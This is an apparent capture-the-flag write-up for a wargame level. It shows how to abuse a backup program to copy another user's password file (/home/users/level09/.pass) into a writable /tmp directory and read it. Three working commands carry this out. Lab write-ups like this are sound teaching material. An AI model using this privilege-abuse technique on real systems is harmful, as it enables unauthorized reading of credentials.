The program takes an FILE_PATH as an argument. It will read this file and copy it in ./backups/ + FILE_PATH

For the program to work, each directory in the FILE_PATH should exist in backup, or else the program won't be able to create the copy.

We want to read /home/users/level09/.pass

We go in /tmp, which is the only directory where we have write access. Then we create backups//home/users/level09/

$ mkdir -p backups//home/users/level09/

Now, we just need to call the level08 program with the path to the .pass file

$ ~/level08 /home/users/level09/.pass

The file was copied successfully, just read it and copy the flag

$ cat backups/home/users/level09/.pass